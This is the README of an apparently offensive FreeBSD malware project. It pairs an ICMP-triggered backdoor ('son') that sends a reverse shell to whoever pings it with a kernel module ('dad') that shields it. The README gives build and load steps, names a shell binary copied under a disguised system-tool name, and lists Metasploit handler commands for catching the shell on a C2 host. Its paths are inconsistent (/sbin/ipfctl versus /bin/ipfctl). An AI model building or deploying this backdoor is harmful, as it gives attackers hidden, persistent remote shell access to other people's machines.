# dad_son

Malware that listens for ICMP echo requests with a code of 1 and sends back a shell to that IP (this is called `son`), and a FreeBSD kernel module that protects that listener/shell giver (known as `dad`).

## Requirements

libpcap, and the executable that you want to run on ping as /sbin/ipfctl. stdin, out, and err are redirected from son to this executable.

## Build

To compile dad.ko, simply run make on a system with the FreeBSD kernel source tree of your choice in `/usr/src`.  Download the source tree with `wget http://ftp.freebsd.org/pub/FreeBSD/releases/amd64/$(uname -r)/src.txz`, and unzip with `tar -C / -xzvf src.txz` to ensure that it's in the correct location.

To compile son, run `cc -o son son.c -lpcap`.

## How to run

* Compile dad (`make`)
* Compile son (`cc -o son son.c -lpcap`)
* Load the dad module (`kldload ./dad.ko`)
* Place a shell binary as `/bin/ipfctl` (`cp /sbin/sh /sbin/ipfctl`)
* Run `son`
* On your C2 box, launch metasploit and run these commands:
```
use exploit/multi/handler
set LPORT 8888
set LHOST 0.0.0.0
set payload linux/x86/shell_reverse_tcp
exploit
```
* In another window on the C2, run `son-ping.py`
* You should now have a shell on the BSD box
